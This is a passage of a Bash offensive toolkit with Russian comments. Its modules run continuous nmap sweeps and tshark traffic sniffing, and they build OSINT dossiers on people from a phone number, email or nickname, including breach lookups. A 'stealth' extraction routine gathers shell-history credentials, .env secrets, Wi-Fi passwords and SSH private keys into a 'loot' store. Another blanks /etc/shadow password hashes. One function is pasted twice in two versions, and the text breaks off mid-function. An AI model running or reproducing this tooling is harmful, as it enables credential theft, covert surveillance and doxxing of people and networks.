            if [[ -n "$webhook_hits" ]]; then
                echo -e "$webhook_hits"
                core_engine_ui "w" "Анализ: Обнаружены активные слушатели. Зафиксирована интеграция со сторонними сервисами."
                core_engine_loot "recon" "Для цели $r_target обнаружены активные API эндпоинты."
            else
                core_engine_ui "e" "Распространенных эндпоинтов вебхуков не обнаружено."
            fi
            ;;
    esac

    core_engine_ui "line" ""
    core_engine_ui "s" "Diagnostic complete."
    core_engine_wait
}



# --- Анализ Bluetooth устройств ---
run_bluetooth_scan() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "BLUETOOTH RADAR"
    
    # 2. Проверка инструментов через Мозг [5]
    if ! core_engine_validator "pkg" "bluez" "Bluetooth Engine"; then
        if [[ $(id -u) -eq 0 ]]; then
            core_engine_ui "w" "Root detected. Deploying 'bluez' core..."
            core_engine_run "apt-get update && apt-get install bluez -y" "Installing bluez"
        else
            core_engine_ui "!" "Non-Root environment (Samsung A14?)."
            core_engine_ui "i" "Manual action: apt update && apt install bluez"
            core_engine_wait && return
        fi
    fi

    # 3. Активация интерфейса (только для Root/Wiko) [5]
    if [[ $(id -u) -eq 0 ]]; then
        core_engine_ui "Activating Bluetooth Interface..."
        hciconfig hci0 up >/dev/null 2>&1
    fi

    # 4. Визуализация процесса через Синхронизацию [13]
    core_engine_ui "Initializing BlueZ Stack..."
    core_engine_progress 3 "SCANNING PROXIMITY SPECTRUM"
    
    core_engine_ui "!" "Searching for active signals..."
    
    # 5. Исполнение через Глушитель [7]
    local scan_out
    scan_out=$(hcitool scan 2>/dev/null)

    if [[ -z "$scan_out" || "$scan_out" == *"Scanning"* ]]; then
        core_engine_ui "e" "No devices found or Adapter blocked."
        
        # Эвристическая подсказка (Samsung A14 / Non-Root)
        [[ $(id -u) -ne 0 ]] && core_engine_ui "w" "Note: Direct BT access restricted on Non-Root."
    else
        # Чистый вывод без заголовка "Scanning..."
        echo -e "$scan_out" | grep -v "Scanning"
        core_engine_ui "+" "Scan completed."
        
        # 6. Сбор трофеев через узел [11]
        core_engine_loot "bluetooth" "BT Scan Results:\n$scan_out"
    fi
    
    core_engine_wait
}


# ==============================================================================
# @description: Центральный мост консолидации сигналов и эвристического декодинга
# ПОЛНАЯ АВТОНОМИЯ: Безусловный цикл обработки логов без интерактивных пауз
# ==============================================================================
run_deep_bridge() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v2.6 (AUTONOMOUS)"
    
    # Синхронизация путей согласно глобальной архитектуре фреймворка
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local master_loot="$loot_dir/master_intelligence.log"
    mkdir -p "$loot_dir"
    
    # Бесконечный цикл автономного мониторинга входящих сигналов
    while true; do
        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        local pool="/tmp/bridge_pool_$RANDOM.tmp"
        
        # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
        if ls "$loot_dir"/*.log &>/dev/null; then
            touch "$master_loot"
            sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
        fi
        
        # Безусловная проверка пула без использования тяжелых конструкций IF
        [[ ! -s "$pool" ]] && { 
            core_engine_ui "w" "[$timestamp] Ожидание сигналов разведки... База трофеев чиста."
            rm -f "$pool"
            sleep 15  # Автономная пауза ожидания перед новым кругом проверки
            continue
        }

        local total_threads=$(wc -l < "$pool")
        core_engine_ui "line" ""
        core_engine_ui "i" "[$timestamp] Анализ $total_threads активных потоков метаданных..."
        core_engine_ui "w" "Контур: Автопилот моста. Для остановки нажмите [CTRL+C]"
        core_engine_ui "line" ""
        
        core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"

        # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
        while read -r line; do
            [[ -z "$line" ]] && continue
            
            # Очистка входящей строки от технического шума и разделителей
            local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
            
            # 1. Детекция криптографических хэшей через глобальные регулярки ядра
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
                continue
            fi
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
                continue
            fi

            # 2. Финансовый сектор: Детекция валидных IBAN через глобальную регулярку
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_FIN_IBAN"; then
                core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
                continue
            fi

            # 3. УЛЬТИМАТИВНЫЙ КРИПТО-КОНТУР: Динамический перебор матрицы GLOBAL_CRYPTO_TYPES
            local crypto_matched=0
            for crypto_entry in "${GLOBAL_CRYPTO_TYPES[@]}"; do
                # Расщепляем элемент матрицы на регулярное выражение и описание сети
                local regex_pattern="${crypto_entry%%|*}"
                local crypto_desc="${crypto_entry#*|}"
                
                if echo "$raw_data" | grep -qE "$regex_pattern"; then
                    core_engine_ui "s" "RESONANCE: Блокчейн-след ($crypto_desc) зафиксирован -> $raw_data"
                    crypto_matched=1
                    break
                fi
            done
            [[ "$crypto_matched" -eq 1 ]] && continue

            # 4. Анализ утечек идентификаторов через глобальные сигнатуры форензики
            if echo "$raw_data" | grep -qiE "$GLOBAL_SIG_FORENSIC_CONFIG"; then
                core_engine_ui "w" "RESONANCE: Критическая утечка учетных данных / Secret Leak"
                continue
            fi

            # 5. Инфраструктурный анализ скрытых сетей (Dark Web Gateways)
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
                core_engine_ui "e" "RESONANCE: Обнаружена скрытая точка маршрутизации Dark Web"
                continue
            fi

        done < "$pool"

        # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
        cat "$pool" >> "$master_loot"
        rm -f "$pool"
        
        core_engine_ui "line" ""
        core_engine_ui "s" "Синхронизация потоков нейро-моста успешно завершена. Ожидание..."
        
        # Засыпаем на 30 секунд перед следующей итерацией консолидации логов
        sleep 30
    done
}

# --- Сетевое мапирование (Network Mapper) ---
# ==============================================================================
# @description: Модуль комплексного сетевого аудита, маппинга и захвата пакетов
# Интегрирован под ультимативные матрицы сканирования периметра (Linux / Termux)
# ПОЛНАЯ АВТОНОМИЯ: Безбарьерный линейный запуск без интерактивного меню
# ==============================================================================
run_network_analyzer() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "NETWORK INTELLIGENCE & TOPOLOGY v5.0 (AUTONOMOUS)"
    core_engine_ui "!" "Инициализация автоматического сетевого контура..."

    # Бронированный многоуровневый парсинг локального IP адреса подсети
    # Исключаем петлю локального хоста на базе глобального регулярного выражения ядра
    local local_ip=""
    local_ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
    
    if [[ -z "$local_ip" ]]; then
        # Фолбэк-вариант 2: извлечение через ip addr (актуально для Termux/Android)
        local_ip=$(ip addr show 2>/dev/null | grep -w "inet" | grep -vE "$GLOBAL_REGEX_NET_LOOPBACK" | head -n 1 | awk '{print $2}' | cut -d/ -f1)
    fi
    if [[ -z "$local_ip" ]]; then
        # Фолбэк-вариант 3: старый добрый ifconfig
        local_ip=$(ifconfig 2>/dev/null | grep -w "inet" | grep -vE "$GLOBAL_REGEX_NET_LOOPBACK" | head -n 1 | tr -s ' ' | cut -d' ' -f3)
    fi

    # Формируем целевой диапазон /24 на основе полученного IP
    local range=""
    if [[ -n "$local_ip" ]]; then
        range=$(echo "$local_ip" | cut -d. -f1-3)".0/24"
    else
        # Если сеть изолирована или девайс в офлайне — берем глобальный дефолт
        range="$GLOBAL_NET_FALLBACK_RANGE"
    fi
    
    core_engine_ui "s" "Определен целевой диапазон сканирования: $range"
    core_engine_progress 2 "AUTONOMOUS MAPPING INITIALIZATION"

    # Бесконечный цикл автономного сканирования периметра
    while true; do
        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        core_engine_ui "line" ""
        core_engine_ui "i" "[$timestamp] Запуск цикла разведки периметра..."
        core_engine_ui "w" "Режим: Автопилот. Для принудительной остановки нажмите [CTRL+C]"
        core_engine_ui "line" ""
        
        # Гибридный движок: интеллектуальная подстановка мощных глобальных матриц аргументов
        local nmap_cmd="nmap"
        if [[ $(id -u) -eq 0 ]]; then
            nmap_cmd+=" $GLOBAL_NMAP_ROOT_ARGS"
        else
            # Режим Non-Root: безопасный TCP-Connect без вызова Raw Sockets во избежание Kernel Lock
            nmap_cmd+=" $GLOBAL_NMAP_NON_ROOT_ARGS"
        fi
        
        # Выполнение сканирования с перехватом сырого текстового потока
        local raw_scan=""
        raw_scan=$($nmap_cmd "$range" 2>/dev/null)
        
        if [[ -n "$raw_scan" ]]; then
            local current_host=""
            local host_detected_flag=0

            # Построчный эвристический разбор вывода nmap через глобальные паттерны-фильтры
            while read -r line; do
                [[ -z "$line" ]] && continue
                
                # Триггер 1: Обнаружение заголовка нового хоста в потоке через внешнюю матрицу
                if echo "$line" | grep -qEi "$GLOBAL_REGEX_NET_REPORT"; then
                    current_host=$(echo "$line" | awk '{print $NF}' | tr -d '()')
                    core_engine_ui "s" "HOST TARGET: [ONLINE] -> $current_host"
                    host_detected_flag=1
                    continue
                fi
                
                # Триггер 2: Перехват строк с открытыми портами и сигнатурами запущенных служб
                if echo "$line" | grep -qEi "$GLOBAL_REGEX_NET_PORT_LINE"; then
                    core_engine_ui "y" "   └── SERVICE: $line"
                fi
            done <<< "$raw_scan"
            
            [[ "$host_detected_flag" -eq 0 ]] && core_engine_ui "w" "Активные узлы в диапазоне $range не ответили на сетевые маркеры."
        else
            core_engine_ui "e" "Критический сбой выполнения бинарного файла nmap. Проверка окружения..."
        fi
        
        # Интервал между циклами сканирования (60 секунд), чтобы не перегружать стек сети
        sleep 60
    done
}



# ==============================================================================
# @description: Модуль автоматического сбора сетевых данных и анализа трафика
# Интегрирован под ультимативные матрицы ядра фреймворка
# ПОЛНАЯ АВТОНОМИЯ: Динамический расчет таймингов + Фильтрация целевого трафика
# ==============================================================================
run_network_intelligence() {
    clear
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "NETWORK INTELLIGENCE: TRAFFIC ANALYZER v6.0 (TARGETED AUTO)"
    
    # Слой 2: Проверка TShark через Мозг [5]
    if ! core_engine_validator "pkg" "tshark" "TShark Core"; then
        core_engine_ui "e" "Критический компонент TShark не найден. Выход."
        return
    fi

    # Слой 3: Авто-определение интерфейса через Метрики [12]
    local iface=$(ip route | grep default | grep -oP 'dev \K\S+' || echo "eth0")
    core_engine_ui "s" "Active interface detected: $iface"
    core_engine_ui "!" "Запуск параллельных контуров перехвата на автопилоте..."
    core_engine_ui "w" "Для завершения работы модулей зажмите [CTRL+C]"
    core_engine_ui "line" ""

    # Глобальный BPF-фильтр для TShark: пишем только сигналы, управляющие протоколы и сессии.
    # Отсекаем: весь потоковый DATA-трафик, видео, музыку, торренты, тяжелый TLS-содержимое.
    local targeted_bpf_filter="port 53 or port 80 or port 21 or port 23 or port 25 or port 110 or port 143 or (tcp[tcpflags] & (tcp-syn|tcp-fin|tcp-rst) != 0)"

    # Слой 4: Потоковый Sniffer — запуск в изолированном фоне
    {
        tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
        | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
            core_engine_loot "traffic_leads" "IFACE: $iface | LEAD: $line"
        done
    } &
    local sniffer_pid=$!

    # Слой 5: Автономный цикл Traffic Record с динамической эвристикой и фильтрацией
    while true; do
        local timestamp=$(date "+%H%M")
        local date_stamp=$(date "+%Y-%m-%d %H:%M:%S")
        local filename="${BASE_DIR:-./}/prime_loot/capture_${timestamp}.pcap"
        
        # --- БЛОК ЭВРИСТИКИ (Интеллектуальный расчет нагрузки) ---
        core_engine_ui "i" "Анализ плотности целевого трафика..."
        
        # Считаем количество только целевых пакетов за 3 секунды тест-драйва
        local packet_count=$(tshark -i "$iface" -f "$targeted_bpf_filter" -a duration:3 -T fields -e frame.number 2>/dev/null | wc -l)
        local duration=300 # Дефолт-баланс
        local load_status="MEDIUM"

        if [[ "$packet_count" -gt 100 ]]; then
            duration=60
            load_status="HIGH (STORM)"
        elif [[ "$packet_count" -lt 15 ]]; then
            duration=900
            load_status="LOW (IDLE)"
        fi

        core_engine_ui "+" "Эвристика: Целевой трафик зафиксирован как $load_status ($packet_count пак/3сек)"
        core_engine_ui "i" "[$date_stamp] Запись отфильтрованной сессии в $(basename "$filename") на $duration сек..."
        
        # --- Исполнение целевой записи ---
        # Флаг -f применяет наш фильтр на уровне ядра захвата пакетов
        tshark -i "$iface" -f "$targeted_bpf_filter" -a duration:"$duration" -w "$filename" 2>/dev/null
        
        # Валидация результата через Мозг [5]
        if core_engine_validator "file" "$filename" "PCAP Archive"; then
            core_engine_ui "+" "Сессия целевого захвата сохранена и очищена от мусора."
            echo "[$date_stamp] SRC: run_network_intelligence | CAPTURE: $(basename "$filename") | DUR: ${duration}s | LOAD: $load_status | FILTER: TRUE" >> "${BASE_DIR:-./}/prime_loot/bridge_signals.log"
        else
            core_engine_ui "e" "Ошибка или пустой целевой поток при записи сессии."
        fi
        
        # Контроль жизнеспособности фонового потока
        if ! kill -0 $sniffer_pid 2>/dev/null; then
            {
                tshark -i "$iface" -Y "http.request || dns.flags.response == 0" -T fields -e http.host -e dns.qry.name 2>/dev/null \
                | stdbuf -oL awk NF | stdbuf -oL uniq | while read -r line; do
                    core_engine_loot "traffic_leads" "IFACE: $iface | LEAD: $line"
                done
            } &
            sniffer_pid=$!
        fi
    done
}

# ==============================================================================
# @description: Центральный мост консолидации сигналов и эвристического декодинга
# ПОЛНАЯ АВТОНОМИЯ: Безусловный цикл обработки логов без интерактивных пауз
# ==============================================================================
run_deep_bridge() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME BRIDGE: NEURAL INTELLIGENCE LINK v3.6 (TOTAL INTEGRATION)"
    
    # Синхронизация путей согласно глобальной архитектуре фреймворка
    local loot_dir="${PRIME_LOOT:-./prime_loot}"
    local master_loot="$loot_dir/master_intelligence.log"
    mkdir -p "$loot_dir" 2>/dev/null
    
    # Бесконечный цикл автономного мониторинга входящих сигналов
    while true; do
        local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
        local pool="/tmp/bridge_pool_$RANDOM.tmp"
        
        # --- СЛОЙ 1: КОНСОЛИДАЦИЯ СИГНАЛОВ (Изоляция от циклической записи) ---
        if ls "$loot_dir"/*.log &>/dev/null; then
            touch "$master_loot"
            sort -u "$loot_dir"/*.log 2>/dev/null | grep -v '^$' | grep -v "master_intelligence" > "$pool"
        fi
        
        # Безусловная проверка пула без использования тяжелых конструкций IF
        [[ ! -s "$pool" ]] && { 
            core_engine_ui "w" "[$timestamp] Ожидание сигналов разведки... База трофеев чиста."
            rm -f "$pool"
            sleep 15  # Автономная пауза ожидания перед новым кругом проверки
            continue
        }

        local total_threads=$(wc -l < "$pool")
        core_engine_ui "line" ""
        core_engine_ui "i" "[$timestamp] Анализ $total_threads active потоков метаданных..."
        core_engine_ui "w" "Контур: Автопилот моста. Для остановки нажмите [CTRL+C]"
        core_engine_ui "line" ""
        
        core_engine_progress 3 "DECODING_INTELLIGENCE_POOL"

        # --- СЛОЙ 2: ЭВРИСТИЧЕСКИЙ ДЕКОДЕР ЯДРА ---
        while read -r line; do
            [[ -z "$line" ]] && continue
            
            # Очистка входящей строки от технического шума и разделителей
            local raw_data=$(echo "$line" | awk -F ' -> ' '{print $2}' | xargs || echo "$line")
            
            # 1. Детекция криптографических хэшей через твои ГЛОБАЛЬНЫЕ регулярки
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_MD5"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт MD5 -> $raw_data"
                continue
            fi
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_HASH_SHA256"; then
                core_engine_ui "y" "RESONANCE: Обнаружен хэш-артефакт SHA-256 -> $raw_data"
                continue
            fi

            # 2. Финансовый сектор: Детекция валидных IBAN через твою ГЛОБАЛЬНУЮ регулярку
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_FIN_IBAN"; then
                core_engine_ui "s" "RESONANCE: Финансовый актив (IBAN) верифицирован -> $raw_data"
                continue
            fi

            # 3. УЛЬТИМАТИВНЫЙ КРИПТО-КОНТУР: Динамический перебор матрицы GLOBAL_CRYPTO_TYPES
            local crypto_matched=0
            for crypto_entry in "${GLOBAL_CRYPTO_TYPES[@]}"; do
                local regex_pattern="${crypto_entry%%|*}"
                local crypto_desc="${crypto_entry#*|}"
                
                if echo "$raw_data" | grep -qE "$regex_pattern"; then
                    core_engine_ui "s" "RESONANCE: Блокчейн-след ($crypto_desc) зафиксирован -> $raw_data"
                    crypto_matched=1
                    break
                fi
            done
            [[ "$crypto_matched" -eq 1 ]] && continue

            # 4. Анализ утечек идентификаторов через ГЛОБАЛЬНЫЙ комплекс статического анализа
            if echo "$raw_data" | grep -qiE "$GLOBAL_STATIC_SIGNATURES"; then
                core_engine_ui "w" "RESONANCE: Критическая утечка данных / Артефакт Сигнатуры -> $raw_data"
                continue
            fi

            # 5. Инфраструктурный анализ скрытых сетей и Web3 через твою ГЛОБАЛЬНУЮ переменную
            if echo "$raw_data" | grep -qE "$GLOBAL_REGEX_DARKWEB"; then
                core_engine_ui "e" "RESONANCE: Обнаружен маршрут Скрытой Сети / Web3 Node -> $raw_data"
                continue
            fi

        done < "$pool"

        # --- СЛОЙ 3: СИНХРОНИЗАЦИЯ И САНИТАРНАЯ ОЧИСТКА ---
        cat "$pool" >> "$master_loot"
        rm -f "$pool"
        
        core_engine_ui "line" ""
        core_engine_ui "s" "Синхронизация потоков нейро-моста успешно завершена. Ожидание..."
        
        sleep 30
    done
}

suggest_action() {
    local func=$1
    local data=$2
    
    # Слой 1: Визуальный резонанс через Голос [1]
    # Показываем только первые 15 символов данных для чистоты экрана
    local preview="${data:0:15}..."
    
    # Слой 2: Запрос через Органы чувств [3] и Валидатор [5]
    # Используем желтый акцент для данных и белый для функции
    echo -en "${B}>>> Intelligence suggests ${W}$func${B} for: ${Y}$preview${NC} | "
    
    if core_engine_validator "read" "Execute?"; then
        # Слой 3: Исполнение через Глушитель [7]
        core_engine_ui "i" "Executing linked action: $func"
        $func "$data"
    else
        core_engine_ui "i" "Action bypassed. Data indexed."
    fi
}

# ==============================================================================
# @description: Высокоскоростной движок OSINT с каскадными API-матрицами v14.2
# ==============================================================================
run_smart_osint_engine() {
    clear
    core_engine_ui "h" "PRIME RECON: ULTIMATE OSINT CORE v14.2"

    # Ввод через стандартный input Ядра
    local INPUT=$(core_engine_input "text" "TARGET (Nick, Phone, Email, IP, or Domain)")
    [[ -z "$INPUT" ]] && return

    local raw_log="/tmp/prime_recon_$RANDOM.log"
    
    core_engine_progress 2 "OSINT_SCAN_INIT"

    # --- 1. SOCIAL SCAN (Если ввод — это никнейм) ---
    if ! echo "$INPUT" | grep -Eq "$GLOBAL_REGEX_EMAIL|$GLOBAL_REGEX_PHONE|$GLOBAL_REGEX_IP|$GLOBAL_REGEX_DOMAIN"; then
        # Твой код ошибки здесь
        core_engine_ui "i" "Scanning Social Signatures (Ghost Mode)..."
        
        local sites=("${GLOBAL_OSINT_SITES[@]}")
        local total_sites=${#sites[@]}
        local current_index=0

        for entry in "${sites[@]}"; do
            ((current_index++))
            local url="${entry%%|*}"
            local name="${entry#*|}"
            
            local progress
            progress=$(printf "[%02d/%02d]" "$current_index" "$total_sites")

            local status
            status=$(curl -s -o /dev/null -L -w "%{http_code}" -A "$GLOBAL_NETWORK_UA" "${url}${INPUT}" --connect-timeout 4)
            
            if [ "$status" == "200" ]; then
                echo "[+] FOUND on $name: ${url}${INPUT}" >> "$raw_log"
                core_engine_ui "s" "$progress Match confirmed: $name"
            else
                echo -ne " [.] Проверка: $progress $name...\r"
            fi
        done
        echo -ne "                                                       \r"
        
        local gh_api="${GLOBAL_API_IDENTITY_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${gh_api}${INPUT}" >> "$raw_log" 2>/dev/null
    fi

    # --- 2. PHONE INTEL (Если ввод — мобильный номер) ---
    if is_valid "$INPUT" "GLOBAL_REGEX_PHONE";
    then
        core_engine_ui "i" "Deep-Querying Global Phone Databases..."
        
        local active_phone_api="${GLOBAL_API_PHONE_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_phone_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        local phone_info=$(grep -oE '"name":"[^"]+"|"oper":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$phone_info" ]] && core_engine_ui "s" "Operator Data: $phone_info"
    fi

    # --- 3. DATA BREACH ANALYZER (Если ввод — email) ---
    if is_valid "$INPUT" "GLOBAL_REGEX_EMAIL"; then

        core_engine_ui "i" "Cross-referencing Leak Databases..."
        
        local active_breach_api="${GLOBAL_API_BREACH_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_breach_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        if grep -q "results" "$raw_log"; then
            core_engine_ui "w" "Breach Detected: Target found in global COMB leak."
            echo "[!] WARNING: Data leak detected for $INPUT" >> "$raw_log"
        fi
    fi

    # --- 4. NETWORK & IP ANALYZER (Если ввод — IP адрес) ---
    if is_valid "$INPUT" "GLOBAL_REGEX_IP"; then

        core_engine_ui "i" "Analyzing Network Infrastructure & GeoIP..."
        
        local active_net_api="${GLOBAL_API_NETWORK_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_net_api}${INPUT}/json" >> "$raw_log" 2>/dev/null
        
        local net_info=$(grep -oE '"org":"[^"]+"|"country_name":"[^"]+"|"city":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$net_info" ]] && core_engine_ui "s" "Network Route Found:\n$net_info"
    fi

    # --- 5. DOMAIN & DNS CORE (Если ввод — сайт или домен) ---
    if is_valid "$INPUT" "GLOBAL_REGEX_DOMAIN" && ! is_valid "$INPUT" "GLOBAL_REGEX_EMAIL"; then

        core_engine_ui "i" "Resolving Domain DNS Records & Whois Registry..."
        
        local active_dns_api="${GLOBAL_API_DOMAIN_NODES[2]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_dns_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        local active_whois_api="${GLOBAL_API_DOMAIN_NODES[3]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_whois_api}${INPUT}" >> "$raw_log" 2>/dev/null
    fi

    # --- 6. ГЕНЕРАЦИЯ ФИНАЛЬНОГО ДОСЬЕ ---
    core_engine_ui "line" ""
    core_engine_ui "s" "INTELLIGENCE DOSSIER GENERATED"
    core_engine_ui "line" ""
    
    local hits=$(grep -cE "FOUND|!|oper|org|country_name|login" "$raw_log" 2>/dev/null || echo 0)
    echo -e "${B}Target Identification:${NC} $INPUT"
    echo -e "${Y}Correlation Level:${NC} $hits matches found."
    
    echo -e "\n${G}--- DETAILED FINDINGS ---${NC}"
    if [ -f "$raw_log" ]; then
        grep -E "FOUND|oper|name|location|WARNING|org|country_name|city" "$raw_log" | sort -u
        if is_valid "$INPUT" "GLOBAL_REGEX_DOMAIN"; then

            head -n 15 "$raw_log" 2>/dev/null
        fi
    else
        echo -e "${R}No data collected.${NC}"
    fi
    
    core_engine_loot "osint" "Dossier for $INPUT created. Hits: $hits"
    rm -f "$raw_log"
    core_engine_ui "line" ""

    core_engine_wait
}



# ==============================================================================
# @description: Модуль форензики хоста и управления локальными учетными записями
# ==============================================================================
run_pc_recovery_ultimate() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "RECOVERY & FORENSIC ENGINE v3.0"

    # Слой 2: Органы чувств — Построение интерактивного меню
    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.5 (Signatures Core)"
    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac Account Management"
    core_engine_item "B" "Back" "Return to Main Menu"
    core_engine_ui "line" ""

    local choice=$(core_engine_input "select" "Select Forensic Action")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- Слой Stealth Extract (Сбор системных артефактов) ---
            clear
            core_engine_ui "h" "FORENSICS: STEALTH ARTIFACT EXTRACTION"
            core_engine_ui "i" "Инициализация подсистем PRIME_EXTRACT..."
            
            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
            sleep 1
            
            # Временный буфер для аккумуляции собранных данных перед отправкой в loot
            local buffer=""
            
            # 1. Анализ истории команд терминалов (Bash/Zsh) через глобальные сигнатуры
            core_engine_ui "i" "Парсинг истории терминалов на учетные данные..."
            local hist=$(grep -hE "$GLOBAL_SIG_FORENSIC_HIST" /home/*/.{bash,zsh}_history 2>/dev/null)
            
            # 2. Поиск конфигурационных файлов и переменных окружения
            core_engine_ui "i" "Сканирование структуры директорий на секреты и .env..."
            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "$GLOBAL_SIG_FORENSIC_CONFIG" 2>/dev/null)

            # 3. Анализ Wi-Fi профилей (Доступы к беспроводным сетям)
            core_engine_ui "i" "Извлечение конфигураций беспроводных сетей..."
            local wifi=""
            [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)

            # 4. Поиск приватных криптографических ключей SSH
            core_engine_ui "i" "Локация приватных SSH/PEM ключей..."
            local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)

            # Слой 3: Структурирование и агрегация трофеев в хранилище Ядра
            buffer="Host: $(hostname)\nTimestamp: $(date)\n\n[--- HISTORY ARTIFACTS ---]\n$hist\n\n[--- CONFIG SECRET ARTIFACTS ---]\n$configs\n\n[--- WIFI CREDENTIALS ---]\n$wifi\n\n[--- SSH PRIVATE KEYS ---]\n$ssh_keys"
            
            # Экспорт в системную loot-директорию
            core_engine_loot "forensic" "$buffer"
            
            core_engine_ui "line" ""
            core_engine_ui "s" "Сбор артефактов успешно завершен. Следы LaZagne/Python отсутствуют."
            ;;

        "2") # --- Слой Smart Password Reset (Управление доступом) ---
            clear
            core_engine_ui "h" "ADMINISTRATION: PASSWORD RESET MATRIX"
            core_engine_ui "i" "Анализ целевой среды и структуры разделов..."
            
            # Поиск Windows SAM реестра на смонтированных накопителях
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            if [[ -n "$win_sam" ]]; then
                core_engine_ui "w" "Обнаружена целевая база данных Windows SAM: $win_sam"
                # Проверка наличия и вызов утилиты обработки SAM-файлов
                core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
            else
                # Определение Unix-архитектуры на основе системных метрик Ядра
                local os_t="Linux"
                [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
                core_engine_ui "i" "Идентифицирована операционная система: $os_t"

                local users=""
                if [[ "$os_t" == "macOS" ]]; then
                    # Парсинг локальных пользователей macOS через директорию служб
                    users=$(dscl . list /Users | grep -v '^_\|root')
                else
                    # Чистый парсинг реальных пользователей Linux (UID >= 1000) из /etc/passwd
                    users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                fi
                
                if [[ -z "$users" ]]; then
                    core_engine_ui "e" "Локальные пользователи в системе не обнаружены."
                    core_engine_wait
                    return 1
                fi

                core_engine_ui "line" ""
                core_engine_ui "i" "Доступные учетные записи для модификации:"
                
                # Построение динамического меню на основе списка системных пользователей
                for u in $users; do 
                    core_engine_item "$u" "$u" "Локальный пользователь ОС"
                done
                core_engine_ui "line" ""
                
                local t_user=$(core_engine_input "select" "Выберите целевого пользователя")
                [[ -z "$t_user" || "$t_user" == "b" || "$t_user" == "B" ]] && return

                # Проверка, что выбранный пользователь действительно присутствует в списке
                if echo "$users" | grep -qxw "$t_user"; then
                    if [[ "$os_t" == "Linux" ]]; then
                        core_engine_ui "w" "Сброс пароля для пользователя $t_user (Очистка хэша shadow)..."
                        # Атомарная безопасная правка /etc/shadow через встроенный изолятор ядра
                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping Linux shadow password"
                        core_engine_ui "s" "Хэш shadow очищен. Вход для пользователя '$t_user' теперь открыт без пароля."
                        core_engine_loot "password_reset" "Сброшен пароль пользователя Linux: $t_user"
                    elif [[ "$os_t" == "macOS" ]]; then
                        local np=$(core_engine_input "text" "Введите новый пароль для учетной записи macOS")
                        if [[ -n "$np" ]]; then
                            core_engine_ui "w" "Перезапись пароля через dscl..."
                            core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password via DSCL"
                            core_engine_ui "s" "Пароль пользователя macOS '$t_user' успешно изменен."
                            core_engine_loot "password_reset" "Изменен пароль пользователя macOS: $t_user"
                        fi
                    fi
                else
                    core_engine_ui "e" "Ошибка: Указанный пользователь не найден в системной таблице."
                fi
            fi
            ;;
    esac

    core_engine_ui "line" ""
    core_engine_wait
}


run_crypto_forge() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME CRYPTO-FORGE & MIRROR v12.0"

